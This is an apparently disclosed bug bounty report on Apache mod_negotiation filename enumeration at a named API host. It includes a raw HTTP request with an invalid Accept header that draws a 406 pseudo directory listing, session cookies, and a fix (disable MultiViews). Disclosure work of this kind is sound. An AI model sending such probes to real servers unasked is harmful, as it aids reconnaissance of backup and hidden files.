# Apache mod_negotiation filename bruteforcing https://api.ratelimited.me

## Report Details
- **Report ID**: 475167
- **URL**: https://hackerone.com/reports/475167
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-01-05T22:26:17.964Z
- **Disclosed**: 2023-08-01T04:40:07.369Z

## Reporter
- **Username**: codeslayer1337
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ratelimited

## Vulnerability Information
mod_negotiation is an Apache module responsible for selecting the document that best matches the clients capabilities, from one of several available documents. If the client provides an invalid Accept header, the server will respond with a 406 Not Acceptable error containing a pseudo directory listing. This behaviour can help an attacker to learn more about his target, for example, generate a list of base names, generate a list of interesting extensions, look for backup files and so on.
This vulnerability affects Web Server.

POC:
GET /index HTTP/1.1
Host: api.ratelimited.me
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: codeslayer137
Accept-Language: id,en-US;q=0.7,en;q=0.3
Connection: close
Cookie: __cfduid=d1223d3114b0d6a19cb09dbdbf358c2721544548659; fs_uid=rs.fullstory.com`HCE07`5666823336886272:5639274879778816; PHPSESSID=iipu5birnh9jap713248e5vlb7; _ga=GA1.2.1698835729.1546721836; _gid=GA1.2.1401928030.1546721836; mp_9e50b60442d3361880f79100f15e5aac_mixpanel=%7B%22distinct_id%22%3A%20%221681fc8d6fc1ee-00a6f91171d9d8-12666d4a-e1000-1681fc8d6fd2cc%22%2C%22%24device_id%22%3A%20%221681fc8d6fc1ee-00a6f91171d9d8-12666d4a-e1000-1681fc8d6fd2cc%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D
Upgrade-Insecure-Requests: 1

## Impact

Possible information disclosure: directory listing, filename bruteforcing, backup files.
How to fix this vulnerability
Disable the MultiViews directive from Apache's configuration file and restart Apache.

## Attachments
- api.jpg
